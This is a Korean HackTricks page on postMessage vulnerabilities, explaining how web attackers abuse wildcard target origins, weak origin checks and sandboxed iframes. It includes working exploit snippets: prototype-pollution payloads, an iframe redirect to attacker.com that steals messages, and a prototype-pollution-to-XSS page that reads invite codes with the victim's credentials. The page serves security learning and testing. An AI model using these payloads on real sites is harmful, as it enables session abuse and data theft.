# PostMessage 취약점

## PostMessage 취약점

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>

## **PostMessage** 보내기

**PostMessage**는 다음 함수를 사용하여 메시지를 보냅니다:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
**targetOrigin**은 '\*' 또는 _https://company.com_과 같은 URL일 수 있습니다.\
**두 번째 시나리오**에서는 **메시지를 해당 도메인으로만 보낼 수 있습니다**(창 객체의 출처가 다른 경우에도 해당됨).\
와일드카드를 사용하면 **메시지를 어떤 도메인으로든 보낼 수 있으며**, 창 객체의 출처로 보내집니다.

### iframe 및 **targetOrigin**에서의 와일드카드 공격

[**이 보고서**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)에서 설명한대로, **iframed**될 수 있는 페이지(X-Frame-Header 보호 없음)를 찾고, 와일드카드(\*)를 사용하여 **postMessage**를 통해 **민감한** 메시지를 보내는 경우, **iframe**의 **출처**를 **수정**하여 **민감한** 메시지를 자신이 제어하는 도메인으로 **유출**할 수 있습니다.\
페이지가 iframed될 수 있지만 **targetOrigin**이 **URL로 설정되어 있고 와일드카드가 아닌 경우**, 이 **트릭은 작동하지 않습니다**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener 악용

**`addEventListener`**은 JS에서 **`postMessages`를 기대하는 함수**를 선언하는 데 사용됩니다.\
다음과 유사한 코드가 사용될 것입니다:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
이 경우 코드가 하는 **첫 번째 작업**은 **origin을 확인하는 것**입니다. 이는 페이지가 받은 정보로 **민감한 작업**(예: 비밀번호 변경)을 수행할 경우에 특히 중요합니다. **만약 origin을 확인하지 않으면 공격자는 희생자로부터 임의의 데이터를 이 엔드포인트로 보내 비밀번호를 변경**할 수 있습니다(이 예시에서).

### 열거

현재 페이지에서 **이벤트 리스너를 찾기 위해** 다음을 수행할 수 있습니다:

* JS 코드에서 `window.addEventListener`와 `$(window).on`(_JQuery 버전_)을 **검색**합니다.
* 개발자 도구 콘솔에서 다음을 **실행**합니다: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* 브라우저의 개발자 도구에서 _Elements --> Event Listeners_로 **이동**합니다.

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta)나 [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)와 같은 **브라우저 확장 프로그램**을 사용합니다. 이 브라우저 확장 프로그램은 모든 메시지를 **가로채서 보여줍니다**.

### Origin 확인 우회

- **`event.isTrusted`** 속성은 진짜 사용자 동작으로 생성된 이벤트에 대해서만 `True`를 반환하므로 안전하다고 간주됩니다. 올바르게 구현된 경우 우회하기 어렵지만, 보안 검사에서의 중요성은 주목할 만합니다.

- PostMessage 이벤트에서 origin 유효성 검사를 위해 **`indexOf()`**를 사용하는 것은 우회될 수 있습니다. 이 취약점을 설명하는 예시는 다음과 같습니다:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- `String.prototype.search()`의 **`search()`** 메서드는 정규식을 위해 사용되는 것이며, 문자열에는 사용되지 않습니다. 정규식 이외의 것을 전달하면 암묵적으로 정규식으로 변환되어 메서드가 잠재적으로 보안에 취약해집니다. 이는 정규식에서 마침표(.)가 와일드카드로 작동하기 때문에 특수하게 만들어진 도메인으로 유효성 검사를 우회할 수 있기 때문입니다. 예를 들면 다음과 같습니다:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- `search()`와 유사한 **`match()`** 함수는 정규식을 처리합니다. 정규식이 잘못 구성된 경우 우회될 수 있습니다.

- **`escapeHtml`** 함수는 문자를 이스케이프하여 입력을 살균하는 것을 목적으로 합니다. 그러나 이 함수는 새로운 이스케이프된 객체를 생성하지 않고 기존 객체의 속성을 덮어씁니다. 이 동작은 악용될 수 있습니다. 특히, 객체의 속성이 `hasOwnProperty`를 인식하지 않는다면 `escapeHtml`은 예상대로 작동하지 않을 것입니다. 아래의 예시에서 이를 확인할 수 있습니다:

- 예상된 실패:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- 이스케이프 우회:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

이 취약점의 문맥에서 `File` 객체는 읽기 전용 `name` 속성으로 인해 취약점이 있습니다. 이 속성은 템플릿에서 사용될 때 `escapeHtml` 함수에 의해 살균되지 않으므로 보안 위험을 야기할 수 있습니다.

- JavaScript의 `document.domain` 속성은 스크립트에 의해 도메인을 단축시킬 수 있으며, 동일한 상위 도메인 내에서 보다 유연한 동일 출처 정책 적용을 가능하게 합니다.

### e.origin == window.origin 우회

%%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%를 사용하여 **샌드박스 iframe**에 웹 페이지를 임베딩할 때, iframe의 origin은 `null`로 설정됩니다. 이는 **샌드박스 속성**과 보안 및 기능에 대한 영향을 고려할 때 특히 중요합니다.

샌드박스 속성에서 **`allow-popups`**를 지정하면 iframe 내에서 열린 팝업 창은 부모의 샌드박스 제한을 상속합니다. 이는 **`allow-popups-to-escape-sandbox`** 속성이 포함되지 않은 경우 팝업 창의 origin도 마찬가지로 `null`로 설정되어 iframe의 origin과 일치합니다.

결과적으로 이러한 조건에서 팝업이 열리고 iframe에서 팝업으로 메시지가 전송되는 경우, 보내는 쪽과 받는 쪽의 origin이 모두 `null`로 설정됩니다. 이 상황에서 **`e.origin == window.origin`**은 true(`null == null`)로 평가됩니다. 왜냐하면 iframe과 팝업은 모두 `null`의 동일한 origin 값을 공유하기 때문입니다.

자세한 정보는 다음을 **참조**하세요:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source 우회

메시지가 스크립트가 수신 대기 중인 동일한 창에서 왔는지 확인할 수 있습니다(특히 **브라우저 확장 프로그램의 콘텐츠 스크립트**의 경우 메시지가 동일한 페이지에서 전송되었는지 확인하기 위해 특히 흥미로운 경우):
```javascript
// If it’s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
**`e.source`** 메시지의 강제로 null 값을 만들 수 있습니다. 이를 위해 **`postMessage`**를 보내고 즉시 삭제되는 **iframe**을 생성합니다.

자세한 정보는 다음을 참조하세요:

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header 우회

이러한 공격을 수행하기 위해서는 이상적으로 피해자 웹 페이지를 `iframe` 안에 넣을 수 있어야 합니다. 그러나 `X-Frame-Header`와 같은 일부 헤더는 이러한 동작을 방지할 수 있습니다.\
이러한 시나리오에서는 여전히 덜 은밀한 공격을 사용할 수 있습니다. 취약한 웹 애플리케이션에 새 탭을 열고 통신할 수 있습니다:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### 메인 페이지 차단을 통한 자식에게 보내는 메시지 도용

다음 페이지에서는 **메인** 페이지를 **차단**하여 데이터를 보내기 전에 **자식 iframe**로 보내는 **민감한 postmessage 데이터**를 도용하는 방법을 볼 수 있습니다. 그리고 **자식의 XSS를 악용**하여 데이터가 수신되기 전에 데이터를 **유출**합니다:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframe 위치 수정을 통한 메시지 도용

X-Frame-Header가 없는 웹 페이지에 다른 iframe을 포함시킬 수 있다면, **해당 자식 iframe의 위치를 변경**할 수 있습니다. 따라서, 만약 **와일드카드**를 사용하여 보내진 **postmessage**를 수신 중인 경우, 공격자는 그 iframe의 **출처(origin)**를 자신이 **제어하는 페이지**로 **변경**하여 메시지를 **도용**할 수 있습니다:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### Prototype Pollution 및/또는 XSS로의 postMessage

`postMessage`를 통해 전송된 데이터가 JS에 의해 실행되는 시나리오에서는, **페이지를 iframe**으로 만들고 `postMessage`를 통해 **prototype pollution/XSS**를 악용하여 exploit을 전송할 수 있습니다.

[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)에서 **매우 잘 설명된 XSS**의 예시를 확인할 수 있습니다.

`postMessage`를 통해 **Prototype Pollution을 악용한 후 XSS**를 악용하는 exploit의 예시:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**더 많은 정보**를 위해:

* [**프로토타입 오염**](../deserialization/nodejs-proto-prototype-pollution/)에 대한 페이지 링크
* [**XSS**](../xss-cross-site-scripting/)에 대한 페이지 링크
* [**클라이언트 측 프로토타입 오염으로 인한 XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)에 대한 페이지 링크

## 참고 자료

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* 연습용: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로에서 영웅까지 AWS 해킹 배우기**</summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
